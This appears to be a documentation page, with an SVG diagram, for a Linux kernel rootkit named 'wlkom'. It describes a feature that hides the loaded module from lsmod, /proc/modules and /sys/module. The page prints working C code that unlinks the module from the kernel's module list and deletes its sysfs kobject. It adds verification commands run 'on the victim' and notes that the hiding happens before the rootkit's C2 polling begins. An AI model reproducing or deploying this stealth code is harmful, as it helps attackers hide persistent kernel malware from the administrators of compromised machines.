---
import FeaturePage from '../../layouts/FeaturePage.astro';
---

<FeaturePage
  title="Hide from Module List"
  description="The module removes itself from lsmod, /proc/modules and /sys/module/ immediately on load."
  badge="Optional"
  points="1 pt"
  slug="hide-module"
>

<section class="section">
  <h2 class="section-title">// How it works</h2>
  <div class="prose">
    <p>
      The Linux kernel maintains two data structures that expose loaded modules to userland:
    </p>
    <ul>
      <li>A <strong>doubly-linked list</strong> of <code>struct module</code> accessible via <code>/proc/modules</code> (and <code>lsmod</code>).</li>
      <li>A <strong>kobject</strong> in sysfs under <code>/sys/module/</code>.</li>
    </ul>
    <p>
      <code>hide_module()</code> simply removes <code>THIS_MODULE</code> from both. This is done <em>before</em>
      the C2 polling thread is started, so by the time the rootkit makes its first network request,
      it is already invisible.
    </p>
  </div>
</section>

<section class="section">
  <h2 class="section-title">// Before / After</h2>
  <div class="diagram">
    <svg viewBox="0 0 680 220" xmlns="http://www.w3.org/2000/svg" font-family="'Courier New',monospace">
      <!-- BEFORE -->
      <text x="170" y="22" text-anchor="middle" fill="#e3b341" font-size="11" font-weight="bold">BEFORE — lsmod shows wlkom</text>
      <rect x="20"  y="35" width="130" height="40" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
      <text x="85"  y="55" text-anchor="middle" fill="#8b949e" font-size="10">module_a</text>
      <text x="85"  y="68" text-anchor="middle" fill="#8b949e" font-size="9">list_head</text>
      <line x1="150" y1="55" x2="175" y2="55" stroke="#30363d" stroke-width="1.5"/>
      <rect x="175" y="35" width="130" height="40" rx="4" fill="#161b22" stroke="#e3b341" stroke-width="1" stroke-opacity="0.7"/>
      <text x="240" y="55" text-anchor="middle" fill="#e3b341" font-size="10">wlkom</text>
      <text x="240" y="68" text-anchor="middle" fill="#8b949e" font-size="9">list_head</text>
      <line x1="305" y1="55" x2="330" y2="55" stroke="#30363d" stroke-width="1.5"/>
      <rect x="330" y="35" width="130" height="40" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
      <text x="395" y="55" text-anchor="middle" fill="#8b949e" font-size="10">module_b</text>
      <text x="395" y="68" text-anchor="middle" fill="#8b949e" font-size="9">list_head</text>

      <!-- AFTER -->
      <text x="170" y="130" text-anchor="middle" fill="#00ff41" font-size="11" font-weight="bold">AFTER — wlkom invisible</text>
      <rect x="20"  y="143" width="130" height="40" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
      <text x="85"  y="163" text-anchor="middle" fill="#8b949e" font-size="10">module_a</text>
      <text x="85"  y="176" text-anchor="middle" fill="#8b949e" font-size="9">list_head</text>
      <line x1="150" y1="163" x2="330" y2="163" stroke="#00ff41" stroke-width="1.5"/>
      <rect x="330" y="143" width="130" height="40" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
      <text x="395" y="163" text-anchor="middle" fill="#8b949e" font-size="10">module_b</text>
      <text x="395" y="176" text-anchor="middle" fill="#8b949e" font-size="9">list_head</text>
      <!-- ghost wlkom -->
      <rect x="175" y="143" width="130" height="40" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1" stroke-dasharray="4,3" opacity="0.3"/>
      <text x="240" y="163" text-anchor="middle" fill="#30363d" font-size="10">wlkom (hidden)</text>

      <!-- kobject -->
      <text x="550" y="22" text-anchor="middle" fill="#8b949e" font-size="10">/sys/module/</text>
      <rect x="490" y="35" width="120" height="30" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
      <text x="550" y="55" text-anchor="middle" fill="#8b949e" font-size="10">wlkom/ (removed)</text>
      <line x1="550" y1="65" x2="550" y2="80" stroke="#30363d" stroke-width="1" stroke-dasharray="3,3"/>
      <text x="550" y="93" text-anchor="middle" fill="#8b949e" font-size="10">kobject_del()</text>
    </svg>
  </div>
</section>

<section class="section">
  <h2 class="section-title">// Implementation</h2>
  <div class="code-block">
    <div class="code-header"><span>rootkit/src/hide.c</span><span class="lang">C</span></div>
    <pre><code>{`void hide_module(void)
{
    // Remove from the kernel's module list → invisible in lsmod
    // and /proc/modules
    list_del_init(&THIS_MODULE->list);

    // Remove the kobject from sysfs → invisible in /sys/module/
    kobject_del(&THIS_MODULE->mkobj.kobj);
}`}</code></pre>
  </div>
  <div class="callout">
    <span class="callout-icon">💡</span>
    <p><strong>list_del_init</strong> unlinks the node from the doubly-linked list and reinitialises its pointers to point to itself — safe for subsequent list operations. The module object remains in memory and fully functional; it is simply no longer reachable from the public list traversal.</p>
  </div>
</section>

<section class="section">
  <h2 class="section-title">// Verification</h2>
  <div class="code-block">
    <div class="code-header"><span>On the victim after insmod</span></div>
    <pre><code>{`$ lsmod | grep wlkom
# no output — module is hidden

$ cat /proc/modules | grep wlkom
# no output

$ ls /sys/module/ | grep wlkom
# no output

$ dmesg | tail -3
# kernel log still shows: c2: registered uuid=...`}</code></pre>
  </div>
</section>

</FeaturePage>
